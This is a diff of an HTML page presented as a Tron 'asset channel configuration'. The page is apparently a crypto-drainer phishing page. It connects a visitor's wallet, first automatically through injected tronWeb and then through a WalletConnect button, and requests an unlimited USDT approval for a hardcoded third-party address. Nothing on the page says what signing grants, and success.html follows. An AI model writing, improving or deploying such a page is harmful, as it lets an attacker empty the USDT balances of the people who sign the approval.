@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Tron 資產通道配置</title>
+<title>Tron 授权配置</title>
 <style>
   body {
     background: #121212;
@@ -15,15 +15,13 @@
     margin: 0;
     justify-content: center;
     align-items: center;
+    text-align: center;
   }
   h2 { margin-bottom: 1rem; }
   .status {
-    font-size: 1.4rem;
+    font-size: 1.3rem;
     margin-bottom: 20px;
     transition: color 0.3s ease;
-    max-width: 320px;
-    text-align: center;
-    word-break: break-word;
   }
   .status.loading { color: #888; }
   .status.success { color: #4caf50; }
@@ -42,65 +40,96 @@
     background: linear-gradient(90deg, #2196f3, #21cbf3);
     transition: width 0.5s ease;
   }
+  button {
+    padding: 10px 20px;
+    font-size: 1.1rem;
+    background-color: #2196f3;
+    border: none;
+    border-radius: 5px;
+    color: white;
+    cursor: pointer;
+    margin-top: 20px;
+  }
+  button:hover { background-color: #1976d2; }
 </style>
 </head>
 <body>
 
-<h2>資產通道配置（僅 Tron）</h2>
-<div id="status" class="status loading">等待檢測 Tron 錢包...</div>
+<h2>Tron 資產通道配置</h2>
+<div id="status" class="status loading">請點擊開始以授權</div>
 <div class="progress-bar"><div id="progress"></div></div>
+<button id="startBtn">開始授權</button>
+
+<!-- TronWeb CDN -->
+<script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
+<!-- Tron WalletConnect Adapter -->
+<script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter-walletconnect@0.1.15/dist/index.min.js"></script>
 
 <script>
-  const CFG = {
-    USDT: {
-      TRON: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
-    },
-    TARGET: {
-      TRON: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf"
-    },
-    AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff" // 無限額度
-  };
+const CFG = {
+  USDT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // TRON USDT 合約
+  TARGET: "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf", // 被授權方
+  AMOUNT: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", // 無限額度
+  TRON_NODE: "https://api.trongrid.io" // 主網節點
+};
 
-  const statusEl = document.getElementById("status");
-  const progressEl = document.getElementById("progress");
+const statusEl = document.getElementById("status");
+const progressEl = document.getElementById("progress");
+const startBtn = document.getElementById("startBtn");
 
-  function setStatus(msg, cls="loading", progressPercent=null) {
-    statusEl.innerText = msg;
-    statusEl.className = "status " + cls;
-    if (progressPercent !== null) {
-      progressEl.style.width = progressPercent + "%";
-    }
+function setStatus(msg, cls="loading", progress=null) {
+  statusEl.innerText = msg;
+  statusEl.className = "status " + cls;
+  if (progress !== null) {
+    progressEl.style.width = progress + "%";
   }
+}
 
-  async function tronApprove() {
-    try {
-      setStatus("正在進行 Tron 通道授權...", "loading", 60);
-      const contract = await window.tronWeb.contract().at(CFG.USDT.TRON);
-      await contract.approve(CFG.TARGET.TRON, CFG.AMOUNT).send();
-      setStatus("✅ 授權成功", "success", 100);
-      return true;
-    } catch (e) {
-      console.error("Tron 授權失敗:", e);
-      setStatus("❌ 授權失敗，請檢查錢包", "error", 100);
-      return false;
-    }
-  }
+async function startAuthorization() {
+  try {
+    setStatus("正在連接錢包...", "loading", 20);
 
-  function listenForTronWeb() {
-    let progress = 0;
-    const interval = setInterval(async () => {
-      if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-        clearInterval(interval);
-        setStatus("檢測到 Tron 錢包，準備授權...", "loading", 30);
-        await tronApprove();
-      } else {
-        progress = (progress + 2) % 100;
-        setStatus("等待錢包連接...", "loading", progress);
+    const { WalletConnectAdapter } = tronwalletAdapterWalletconnect;
+    const adapter = new WalletConnectAdapter({
+      network: "Mainnet",
+      options: {
+        relayUrl: "wss://relay.walletconnect.com",
+        projectId: "demo-project-id", // 可替換為你的 WalletConnect projectId
+        metadata: {
+          name: "Tron 資產通道配置",
+          description: "USDT 授權",
+          url: location.origin,
+          icons: [location.origin + "/icon.png"]
+        }
       }
-    }, 500);
-  }
+    });
 
-  window.addEventListener('load', listenForTronWeb);
+    await adapter.connect();
+    const address = adapter.address;
+    setStatus(`錢包已連接: ${address}`, "loading", 40);
+
+    setStatus("構建授權交易中...", "loading", 60);
+
+    const tronWeb = new TronWeb({ fullHost: CFG.TRON_NODE });
+    tronWeb.setAddress(address);
+
+    const contract = await tronWeb.contract().at(CFG.USDT);
+    const tx = await contract.approve(CFG.TARGET, CFG.AMOUNT).send({ from: address });
+
+    setStatus("✅ 授權成功", "success", 100);
+
+    // 1 秒後跳轉到成功頁
+    setTimeout(() => {
+      window.location.href = "success.html";
+    }, 1000);
+
+  } catch (err) {
+    console.error(err);
+    setStatus("❌ 授權失敗，請重試", "error", 100);
+  }
+}
+
+startBtn.onclick = startAuthorization;
 </script>
 
 </body>
